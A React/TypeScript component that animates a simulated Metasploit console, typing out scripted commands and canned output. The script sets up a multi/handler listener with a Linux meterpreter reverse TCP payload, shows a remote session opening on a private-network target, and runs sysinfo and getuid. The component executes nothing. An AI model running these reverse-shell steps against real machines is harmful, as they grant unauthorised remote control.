import React, { useState, useEffect, useRef } from "react";

interface Step {
  prompt: string;
  cmd: string;
  lines: { text: string; color?: string }[];
}

const MSF_STEPS: Step[] = [
  {
    prompt: "msf6 >",
    cmd: "use exploit/multi/handler",
    lines: [
      { text: "[*] Using configured payload generic/shell_reverse_tcp", color: "text-blue-300" }
    ]
  },
  {
    prompt: "msf6(handler) >",
    cmd: "set payload linux/x64/meterpreter_reverse_tcp",
    lines: [
      { text: "payload => linux/x64/meterpreter_reverse_tcp", color: "text-emerald-400" }
    ]
  },
  {
    prompt: "msf6(handler) >",
    cmd: "set LHOST 192.168.1.38",
    lines: [
      { text: "LHOST => 192.168.1.38", color: "text-emerald-400" }
    ]
  },
  {
    prompt: "msf6(handler) >",
    cmd: "run -j",
    lines: [
      { text: "[*] Exploit running as background job 0.", color: "text-blue-300" },
      { text: "[*] Started reverse TCP handler on 192.168.1.38:4444", color: "text-blue-300" },
      { text: "[*] Sending stage (175644 bytes) to 192.168.1.104...", color: "text-cyan-300" },
      { text: "[+] Meterpreter session 1 opened (192.168.1.38:4444 -> 192.168.1.104:51234)", color: "text-emerald-400 font-semibold" }
    ]
  },
  {
    prompt: "meterpreter >",
    cmd: "sysinfo",
    lines: [
      { text: "Computer        : defense-node.internal", color: "text-white/80" },
      { text: "OS              : Linux 5.15.0-88-generic (x86_64)", color: "text-white/80" },
      { text: "Architecture    : x64", color: "text-white/80" },
      { text: "Meterpreter     : x64/linux", color: "text-emerald-300" }
    ]
  },
  {
    prompt: "meterpreter >",
    cmd: "getuid",
    lines: [
      { text: "Server username: kamal (uid=1000, gid=1000)", color: "text-cyan-300 font-bold" }
    ]
  }
];

export const MetasploitConsole: React.FC = () => {
  const [history, setHistory] = useState<{ id: number; prompt: string; cmd?: string; text?: string; color?: string }[]>([
    { id: 1, prompt: "", text: "[*] Metasploit Framework v6.3.4-dev", color: "text-red-400 font-bold" },
    { id: 2, prompt: "", text: "[*] Exploit console active on tty2", color: "text-white/50" }
  ]);
  const [currentPrompt, setCurrentPrompt] = useState<string>("msf6 >");
  const [typed, setTyped] = useState<string>("");
  const scrollRef = useRef<HTMLDivElement | null>(null);

  useEffect(() => {
    let isMounted = true;
    let stepIdx = 0;
    let nextId = 10;

    const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

    const loop = async () => {
      await sleep(600);

      while (isMounted) {
        const step = MSF_STEPS[stepIdx % MSF_STEPS.length];
        setCurrentPrompt(step.prompt);
        setTyped("");

        // Type command
        for (let i = 0; i <= step.cmd.length; i++) {
          if (!isMounted) return;
          setTyped(step.cmd.slice(0, i));
          await sleep(30 + Math.random() * 25);
        }

        await sleep(300);
        if (!isMounted) return;

        // Push command
        setHistory((prev) => [
          ...prev.slice(-14),
          { id: nextId++, prompt: step.prompt, cmd: step.cmd }
        ]);
        setTyped("");

        // Push output lines
        for (const line of step.lines) {
          if (!isMounted) return;
          await sleep(140 + Math.random() * 80);
          setHistory((prev) => [
            ...prev.slice(-14),
            { id: nextId++, prompt: "", text: line.text, color: line.color }
          ]);
        }

        await sleep(1800);
        stepIdx++;

        // Reset if completed sequence
        if (stepIdx % MSF_STEPS.length === 0) {
          await sleep(1000);
          if (!isMounted) return;
          setHistory([
            { id: nextId++, prompt: "", text: "[*] Metasploit Framework session recycled", color: "text-red-400 font-bold" }
          ]);
        }
      }
    };

    loop();

    return () => {
      isMounted = false;
    };
  }, []);

  useEffect(() => {
    scrollRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [history, typed]);

  return (
    <div className="w-full h-full bg-[#050811]/95 flex flex-col font-mono text-[9.5px] leading-tight select-none overflow-hidden">
      {/* Title Bar */}
      <div className="flex items-center justify-between px-2.5 py-1 bg-[#0b0e1a] border-b border-red-500/20 text-white/70 text-[10px]">
        <div className="flex items-center gap-1.5">
          <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
          <span className="font-bold text-red-400 tracking-wider">msfconsole</span>
          <span className="text-white/30">|</span>
          <span className="text-white/60">framework-v6</span>
        </div>
        <span className="text-[9px] text-red-400/70 font-semibold">TARGET: 192.168.1.104</span>
      </div>

      {/* Terminal View */}
      <div className="flex-1 p-2 overflow-y-auto space-y-1 scrollbar-none">
        {history.map((item) => (
          <div key={item.id} className="break-words">
            {item.cmd !== undefined ? (
              <div className="flex items-start gap-1 text-white">
                <span className="text-red-400 font-bold shrink-0">{item.prompt}</span>
                <span className="text-white font-medium">{item.cmd}</span>
              </div>
            ) : (
              <div className={item.color || "text-white/70"}>{item.text}</div>
            )}
          </div>
        ))}

        {/* Typing Line */}
        <div className="flex items-center gap-1">
          <span className="text-red-400 font-bold shrink-0">{currentPrompt}</span>
          <span className="text-white font-medium">{typed}</span>
          <span className="w-1.5 h-3 bg-red-400 inline-block animate-pulse align-middle ml-0.5" />
        </div>

        <div ref={scrollRef} />
      </div>
    </div>
  );
};
